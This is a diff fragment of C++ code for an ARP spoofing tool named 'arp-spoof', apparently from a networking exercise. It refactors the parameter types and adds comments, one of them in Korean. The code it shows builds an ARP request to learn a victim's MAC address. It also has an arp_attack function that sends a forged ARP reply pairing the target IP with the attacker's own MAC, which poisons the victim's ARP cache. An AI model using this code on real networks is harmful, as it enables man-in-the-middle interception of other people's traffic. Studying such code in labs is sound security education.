@@ -6,7 +6,8 @@ void usage() {
 	printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
 }
 
-bool request_and_get_mac(pcap_t* pcap, Mac myMac, Ip myIp, Ip receiverIp, Mac& receiverMac) {
+bool request_and_get_mac(pcap_t* pcap, const Mac& myMac, const Ip& myIp, const Ip& receiverIp, Mac& receiverMac) {
+    // 1. request
     EthArpPacket packet;
 
     packet.ethHdr_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
@@ -19,17 +20,18 @@ bool request_and_get_mac(pcap_t* pcap, Mac myMac, Ip myIp, Ip receiverIp, Mac& r
     packet.arpHdr_.plen_ = Ip::SIZE;
     packet.arpHdr_.op_ = htons(ArpHdr::REQUEST);
     packet.arpHdr_.smac_ = myMac;
-    packet.arpHdr_.sip_ = static_cast<uint32_t>(myIp);
+    packet.arpHdr_.sip_ = myIp;
     packet.arpHdr_.tmac_ = Mac("00:00:00:00:00:00");
-    packet.arpHdr_.tip_ = static_cast<uint32_t>(receiverIp); 
+    packet.arpHdr_.tip_ = receiverIp; 
 
 
     int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
     if (res != 0) {
         fprintf(stderr, "[Error] request sender mac packet return %d error=%s\n", res, pcap_geterr(pcap));
     }
-    printf("ARP REQUEST packet from %s to %s\n", std::string(myIp).c_str(), std::string(receiverIp).c_str());
+    printf("ARP REQUEST packet from %s to %s\n", string(myIp).c_str(), string(receiverIp).c_str());
 
+    // 2. analysis and get mac
     while (true) {
         struct pcap_pkthdr* header;
         const u_char* packet;
@@ -67,10 +69,13 @@ void arp_attack(pcap_t* handle, const Mac& sender_mac, const Ip& sender_ip, cons
     packet.arpHdr_.hlen_ = Mac::SIZE;
     packet.arpHdr_.plen_ = Ip::SIZE;
     packet.arpHdr_.op_ = htons(ArpHdr::REPLY);
+
+    // target ip와 내 mac 주소가 쌍을 이룸 
     packet.arpHdr_.smac_ = my_mac;
-    packet.arpHdr_.sip_ = static_cast<uint32_t>(target_ip);
+    packet.arpHdr_.sip_ = target_ip; 
+
     packet.arpHdr_.tmac_ = sender_mac;
-    packet.arpHdr_.tip_ = static_cast<uint32_t>(sender_ip); 
+    packet.arpHdr_.tip_ = sender_ip; 
 
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 	if (res != 0) {
